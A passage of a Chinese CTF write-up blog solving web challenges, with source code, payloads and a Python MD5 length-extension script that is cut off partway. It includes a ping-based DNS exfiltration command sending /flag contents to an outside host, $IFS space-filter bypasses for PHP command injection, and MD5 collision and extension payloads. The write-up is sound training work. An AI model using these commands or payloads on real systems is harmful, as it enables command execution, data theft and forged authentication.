src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731687105944-3491c15d-04cd-4203-a5f9-5dc99f6f0788.png" referrerpolicy="no-referrer"></p><p>之后按如下格式使用 ping 命令外带,url 编码之后传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `cat /flag | base64`.xxxxxxx.dnshook.site</span><br></pre></td></tr></table></figure><h2 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h2><h3 id="考点：-9"><a href="#考点：-9" class="headerlink" title="考点："></a>考点：</h3><p><strong>空格绕过 :</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13491028.html"><strong>参考文章</strong></a></p><ul><li>IFS</li></ul><p>$IFS表示分隔符，指定了IFS代表的符号后，该符号会转为空格显示输出</p><p>${IFS},$IFS 和$IFS$9 都表示空格</p><ul><li><p>&lt;&gt;（重定向符）</p></li><li><p>%09（需要 php 环境）</p></li></ul><h3 id="题解：-9"><a href="#题解：-9" class="headerlink" title="题解："></a>题解：</h3><p>进入题目，得到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 高亮显示当前文件内容，方便调试和查看代码结构</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 POST 请求中的参数 &#x27;cmd&#x27; 的值并赋值给 $cmd</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 preg_match 函数检查命令中是否存在空格，如果存在空格则输出提示信息并退出程序</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Space not allowed in command&#x27;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行用户输入的命令，但这样的代码存在严重的安全风险，因为可以执行任意命令</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="variable">$_POST</span> 传入 cmd=cat$&#123;IFS&#125;/flag</span><br></pre></td></tr></table></figure><p><strong>法一：</strong>使用 $IFS 绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730732907871-e9c4116d-2c4e-46a5-9879-213cff0aed72.png" referrerpolicy="no-referrer"></p><p><strong>法二：使用 &lt; 绕过</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731727695578-0432cb7a-7ee2-4641-871a-c43928ed1667.png" referrerpolicy="no-referrer"></p><h2 id="所以你说你懂-MD5"><a href="#所以你说你懂-MD5" class="headerlink" title="所以你说你懂 MD5?"></a>所以你说你懂 MD5?</h2><h3 id="考点：-10"><a href="#考点：-10" class="headerlink" title="考点："></a>考点：</h3><p><strong>哈希长度拓展攻击：</strong><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html"><strong>参考文章</strong></a></p><h3 id="题解：-10"><a href="#题解：-10" class="headerlink" title="题解："></a>题解：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 启动会话</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">// 高亮显示当前文件内容，方便调试和查看代码结构</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 所以你说你懂 MD5 了?</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 POST 请求中的参数 &#x27;apple&#x27; 的值并赋值给 $apple</span></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="comment">// 获取 POST 请求中的参数 &#x27;banana&#x27; 的值并赋值给 $banana</span></span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="comment">// 如果 $apple 等于 $banana 或者 $apple 和 $banana 的 MD5 值不相等，输出提示信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span>!== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;加强难度就不会了?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 什么? 你绕过去了?</span></span><br><span class="line"><span class="comment">// 加大剂量!</span></span><br><span class="line"><span class="comment">// 我要让他成为 string</span></span><br><span class="line"><span class="comment">// 再次获取 POST 请求中的参数并强制转换为字符串后重新赋值给 $apple 和 $banana</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="comment">// 检查条件，如果不满足则输出提示信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span>!== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;难吗?不难!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你还是绕过去了?</span></span><br><span class="line"><span class="comment">// 哦哦哦, 我少了一个等于号</span></span><br><span class="line"><span class="comment">// 再次获取 POST 请求中的参数并强制转换为字符串后重新赋值给 $apple 和 $banana</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="comment">// 检查条件，如果不满足则输出提示信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span>!== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你以为这就结束了</span></span><br><span class="line"><span class="comment">// 如果会话中不存在 &#x27;random&#x27;，则生成一个随机字符串并存储在会话中</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)). <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)). <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你想看到 random 的值吗?</span></span><br><span class="line"><span class="comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span></span><br><span class="line"><span class="comment">// 获取会话中的随机字符串并赋值给 $random</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="comment">// 输出随机字符串的 MD5 值和换行符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果 POST 请求中不存在 &#x27;name&#x27; 参数，则将 $name 设为 &#x27;user&#x27;</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 $name 的末尾是否是 &#x27;admin&#x27;，如果不是则输出提示信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>)!== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不是管理员也来凑热闹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 POST 请求中的参数 &#x27;md5&#x27; 的值并赋值给 $md5</span></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="comment">// 计算随机字符串和 $name 拼接后的 MD5 值，如果与传入的 $md5 不相等，则输出提示信息并终止程序</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>. <span class="variable">$name</span>)!== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;伪造? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 认输了, 看样子你真的很懂 MD5</span></span><br><span class="line"><span class="comment">// 那 flag 就给你吧</span></span><br><span class="line"><span class="comment">// 输出提示信息和读取到的 flag 文件内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;看样子你真的很懂 MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于第一个 if 语句，因为没有禁用数组，直接传入数组绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731737411373-3c287cb9-8672-4520-9645-6ede63388752.png" referrerpolicy="no-referrer"></p><p>第二个 if 语句，数组被禁用了，而且是弱比较，老老实实传字符串吧</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731738066137-83742fca-b7e2-4faa-a1c1-60802150a88a.png" referrerpolicy="no-referrer"></p><p>第三个 if 语句，数组被禁用了，还是强碰撞，还是传字符串吧</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731738302154-515ec98f-7b86-4d92-8c5c-a1efb85ec2de.png" referrerpolicy="no-referrer"></p><p>贴一下目前的输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span>&amp;appple=s1502113478a&amp;bananana=s1885207154a&amp;apppple=ten%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%EF%E4%B5h%A7y%<span class="number">95</span>C%<span class="number">60</span>%<span class="number">8</span>A%E0a%<span class="number">0</span>B%B8%<span class="number">3</span>D%D8%<span class="number">26</span>%F5%A3%<span class="number">13</span>%<span class="number">8</span>F%<span class="number">3</span>F%<span class="number">7</span>D%D4%<span class="number">5</span>Cb%<span class="number">81</span>%<span class="number">25</span>v%<span class="number">98</span>%<span class="number">8</span>CHA%<span class="number">05</span>%<span class="number">0</span>D%ED%C2%<span class="number">8</span>B%E7j%EFou%<span class="number">22</span>%<span class="number">01</span>%<span class="number">10</span>c_%AD%F9%<span class="number">5</span>E%<span class="number">84</span>%A5%C1%<span class="number">95</span>%F9K%<span class="number">3E7</span>%<span class="number">7</span>Bdd%C2dT%<span class="number">98</span>V%B1%F2%DD%B6%<span class="number">2</span>C%F2%<span class="number">7</span>B%E8%<span class="number">19</span>%<span class="number">12</span>%<span class="number">9</span>A%<span class="number">29</span>%<span class="number">9</span>D%<span class="number">5</span>D%<span class="number">13</span>Lm%FEN%<span class="number">85</span>%CE%<span class="number">7</span>E%CD%AF%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">10</span>eA%E9%B0%C4%AA%<span class="number">94</span>%EA%A2%DE%E9%A0%EBP%<span class="number">98</span>%<span class="number">8</span>A%<span class="number">0</span>A_%<span class="number">1</span>D%<span class="number">13</span>%<span class="number">8</span>E%<span class="number">83</span>%DA%C6%<span class="number">97</span>%<span class="number">21</span>%<span class="number">05</span>%<span class="number">82</span>%E7%EA%<span class="number">03</span>_%<span class="number">27</span>%C4&amp;banananana=ten%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%EF%E4%B5h%A7y%<span class="number">95</span>C%<span class="number">60</span>%<span class="number">8</span>A%E0a%<span class="number">0</span>B%B8%<span class="number">3</span>D%D8%<span class="number">26</span>%F5%A3%<span class="number">93</span>%<span class="number">8</span>F%<span class="number">3</span>F%<span class="number">7</span>D%D4%<span class="number">5</span>Cb%<span class="number">81</span>%<span class="number">25</span>v%<span class="number">98</span>%<span class="number">8</span>CHA%<span class="number">05</span>%<span class="number">0</span>D%ED%C2%<span class="number">8</span>B%E7j%EFou%<span class="number">22</span>%<span class="number">01</span>%<span class="number">90</span>c_%AD%F9%<span class="number">5</span>E%<span class="number">84</span>%A5%C1%<span class="number">95</span>%F9K%<span class="number">3E7</span>%FBdd%C2dT%<span class="number">98</span>V%B1%F2%DD%B6%<span class="number">2</span>C%F2%<span class="number">7</span>B%E8%<span class="number">19</span>%<span class="number">12</span>%<span class="number">9</span>A%<span class="number">29</span>%<span class="number">9</span>D%<span class="number">5</span>D%<span class="number">13</span>L%ED%FEN%<span class="number">85</span>%CE%<span class="number">7</span>E%CD%AF%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">10</span>eA%E9%B0%C4%AA%<span class="number">94</span>%EA%A2%DE%E9%A0%EBP%<span class="number">98</span>%<span class="number">0</span>A%<span class="number">0</span>A_%<span class="number">1</span>D%<span class="number">13</span>%<span class="number">8</span>E%<span class="number">83</span>%DA%C6%<span class="number">97</span>%<span class="number">21</span>%<span class="number">05</span>%<span class="number">82</span>%E7j%<span class="number">03</span>_%<span class="number">27</span>%C4</span><br></pre></td></tr></table></figure><p>第四步长度拓展攻击:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_74350234/article/details/141757892">参考文章</a></p><p>贴个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor, sin</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">MD5 Extension Attack</span></span><br><span class="line"><span class="string">====================</span></span><br><span class="line"><span class="string">@refs</span></span><br><span class="line"><span class="string">https://github.com/shellfeel/hash-ext-attack</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MD5</span>:</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D = \</span><br><span class="line">            (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)  <span class="comment"># initial values</span></span><br><span class="line">        <span class="variable language_">self</span>.r: <span class="built_in">list</span>[<span class="built_in">int</span>] = \</span><br><span class="line">            [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>] * <span class="number">4</span> + [<span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>] * <span class="number">4</span> + \</span><br><span class="line">            [<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>] * <span class="number">4</span> + [<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>] * <span class="number">4</span>  <span class="comment"># shift values</span></span><br><span class="line">        <span class="variable language_">self</span>.k: <span class="built_in">list</span>[<span class="built_in">int</span>] = \</span><br><span class="line">            [floor(<span class="built_in">abs</span>(sin(i + <span class="number">1</span>)) * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]  <span class="comment"># constants</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_lrot</span>(<span class="params">self, x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># left rotate</span></span><br><span class="line">        <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="number">32</span> - n)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, chunk: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># update the hash for a chunk of data (64 bytes)</span></span><br><span class="line">        w = <span class="built_in">list</span>(unpack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;I&#x27;</span>*<span class="number">16</span>, chunk))</span><br><span class="line">        a, b, c, d = <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                f = (b &amp; c) | ((~b) &amp; d)</span><br><span class="line">                flag = i</span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">                f = (b &amp; d) | (c &amp; (~d))</span><br><span class="line">                flag = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">                f = (b ^ c ^ d)</span><br><span class="line">                flag = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f = c ^ (b | (~d))</span><br><span class="line">                flag = (<span class="number">7</span> * i) % <span class="number">16</span></span><br><span class="line"> </span><br><span class="line">            tmp = b + \</span><br><span class="line">                <span class="variable language_">self</span>._lrot((a + f + <span class="variable language_">self</span>.k[i] + w[flag])</span><br><span class="line">                           &amp; <span class="number">0xffffffff</span>, <span class="variable language_">self</span>.r[i])</span><br><span class="line">            a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line"> </span><br><span class="line">        <span class="variable language_">self</span>.A = (<span class="variable language_">self</span>.A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.B = (<span class="variable language_">self</span>.B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.C = (<span class="variable language_">self</span>.C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.D = (<span class="variable language_">self</span>.D + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">self, msg: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># extend the hash with a new message (padded)</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(msg) % <span class="number">64</span> == <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">64</span>):</span><br><span class="line">            <span class="variable language_">self</span>.update(msg[i:i + <span class="number">64</span>])</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">self, msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># pad the message</span></span><br><span class="line">        length = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">len</span>(msg) * <span class="number">8</span>)</span><br><span class="line"> </span><br><span class="line">        msg += <span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">        msg += <span class="string">b&#x27;\x00&#x27;</span> * ((<span class="number">56</span> - <span class="built_in">len</span>(msg)) % <span class="number">64</span>)</span><br><span class="line">        msg += length</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">digest</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return the hash</span></span><br><span class="line">        <span class="keyword">return</span> pack(<span class="string">&#x27;&lt;IIII&#x27;</span>, <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_md5</span>(<span class="params">test_string: <span class="built_in">bytes</span></span>) -&gt; <span 